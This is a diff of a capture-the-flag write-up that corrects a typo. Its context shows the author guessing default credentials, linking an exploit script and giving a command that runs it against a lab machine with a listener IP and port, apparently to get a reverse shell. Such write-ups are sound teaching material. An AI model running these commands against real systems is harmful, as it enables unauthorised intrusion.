@@ -140,7 +140,7 @@ We know that john's password has been set to default, so I tried some default pa
 
 Now that we have creds, we can use the exploits. I'm gonna leave the exploit [here](files/exploit.py) for you guys, in case you couldn't find it yourself.
 
-First run the exploit as shown below. The exploit needs the url, username, password, and listening host and porn plus the platform:
+First run the exploit as shown below. The exploit needs the url, username, password, and listening host and port plus the platform:
 
 ~~~
 └─$ python3 exploit.py http://<MACHINE IP>:62337/ john password <YOUR IP> 4444 linux
